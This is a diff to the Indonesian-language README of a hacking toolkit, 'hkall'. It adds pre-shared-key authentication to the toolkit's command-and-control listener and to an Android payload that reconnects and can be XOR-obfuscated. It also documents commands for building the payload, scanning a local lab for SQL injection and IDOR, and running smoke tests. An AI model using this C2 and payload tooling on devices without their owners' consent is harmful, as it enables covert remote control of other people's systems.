@@ -92,10 +92,11 @@ hkall -m c2 --port 4444
 ```
 **Alur:** srv listen → session dari payload (p.2.3) → `use S1` → ketik command → dijalankan di target.
 Catatan: c2 butuh tty (`pkg` saja ketika pkg di install dll). Guard anti-crash ada.
+**Auth PSK:** listener buat/ Load PSK dari `data/c2.psk` (sekali dibuat, chmod 0600). Koneksi tanpa/salah PSK → ditolak (`[-] ... PSK salah`). Payload yang dibangun `-m payload` embed PSK otomatis. **Payload lama pra-PSK tidak bisa konek — build ulang dengan `-m payload`.**
 
 ### 2.3 payload — Android payload builder
 **Prompt:** c2 host, port, obfuscate?.
-**Output:** `data/payload.py` — reconnect + XOR.
+**Output:** `data/payload.py` — reconnect + PSK auth + (opsi) XOR.
 ```bash
 hkall -m payload --host 192.168.1.10 --port 4444
 # jalankan di target:
@@ -299,11 +300,15 @@ hkall -m toolbox
 ## 8. Verification (self-check)
 
 ```bash
+python3 tests/test_smoke.py             # 12 smoke test otomatis (exit 1 bila gagal)
 python3 lab/lab_server.py 8090          # nyalakan lab (device sendiri)
 hkall -m sqli --host "http://127.0.0.1:8090/sqli?x=1"   # → issues: ['...']
 hkall -m idor --host "http://127.0.0.1:8090/user/{{id}}" --range 5  # → [(1,200),(2,200)...]
 hkall -m history --limit 10             # hasil tersimpan
 ```
+
+### Robustness guards
+Semua input user divalidasi: port non-numeric/in-use, IP/MAC/cidr tak valid, durasi bukan angka, trailing comma di `--ports` → semua menghasilkan pesan singkat + return, bukan traceback. `load_cfg` warning bila `config.json` korup. `rs.db` schema mismatch → warning (hapus `data/rs.db` untuk reset). `bin/hkall-deps` lapor `[FAIL]`/`[ok]` per tool.
 
 ---
 
